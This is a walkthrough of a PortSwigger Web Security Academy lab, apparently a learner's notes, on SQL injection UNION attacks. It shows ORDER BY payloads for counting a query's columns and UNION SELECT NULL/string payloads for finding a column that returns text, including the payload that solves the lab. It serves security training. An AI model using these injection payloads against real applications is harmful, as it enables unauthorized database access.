Link : https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

Note go through previous lab :

![image](https://github.com/user-attachments/assets/a06c9de5-cafe-45f2-baed-185bba7911c4)



Goal : Finding Column containing text using union operator.


Rules: for using union operator 

Rule 1 : number and order of columns should be same.

Rule 2 : data type of column should be match 

step 1 should be determine number of columns you can do this technique learning in previous lesions / Lab. 

we will try using order by query to find out the number of columns 


$ 'order by 1 --  

![image](https://github.com/user-attachments/assets/85c165fc-070d-4b4b-a39a-bc97df15be4e)




$ 'order by 2 --  

![image](https://github.com/user-attachments/assets/3d102b07-2beb-4805-a361-aee378e0cdda)





$ 'order by 3  --  

![image](https://github.com/user-attachments/assets/185c4d00-1caf-4fdd-9e6b-a1a8936b2c9b)


$ 'order by 4 --  

![image](https://github.com/user-attachments/assets/ed288cce-a025-4694-9952-dba9bc5063bc)
![image](https://github.com/user-attachments/assets/18db484a-2a31-4bc8-85a5-f83c60388bff)



we got error in order by 4 

so as we got error on 4th column so number of column 4 - 1 = 3

As we got number of column now next step is to find which column will return string or text value.


we can find which column will return string value by iterating  or looping through the null value and replace null value with string.


eg 

as we know there 3 columns in the result so we will use 3 null value in the union query.

reason why we are using null because null value can fit in any type of value.

Query = 'union select null,null,null -- 
![image](https://github.com/user-attachments/assets/b126f1e4-f03c-4de1-b582-4d61c938882a)


Query =  'union select “a”,null,null --

![image](https://github.com/user-attachments/assets/0504617f-daf4-465c-b330-1fe0a67566f7)

![image](https://github.com/user-attachments/assets/da1fc3b6-6d7e-4eee-87e3-23ff0fe4bf91)


And we got <error> means that 1st column  does not support text value.
now we will try with 2nd column 

Query='union select null,'a',null -- 

![image](https://github.com/user-attachments/assets/848413fb-1cab-4674-9804-25c013d1cf66)

![image](https://github.com/user-attachments/assets/26544819-ae43-4dc7-a990-5182467c81d8)



and we got the 2nd column which supports string or text value.
but our work is not over yet we will still check last columns as well .

Query= ‘union select null,null,’a' -- 

![image](https://github.com/user-attachments/assets/dc584b2f-dec7-41c9-9cd4-a58d97f05a65)

and we got error means 3rd column also not support text or string value.


by seeing below image we have to retrive this string from data base.

![image](https://github.com/user-attachments/assets/fac0b149-6d40-4a51-9e85-30839247678b)

Now we know that only 2nd column support string / text we will replace 2nd null value with string and query will look like this 
Query=' union select null,'LEqgpa',null -- 


![image](https://github.com/user-attachments/assets/4e948f5d-5b0a-4e6c-9218-3527ed379091)

And we solved the lab . 


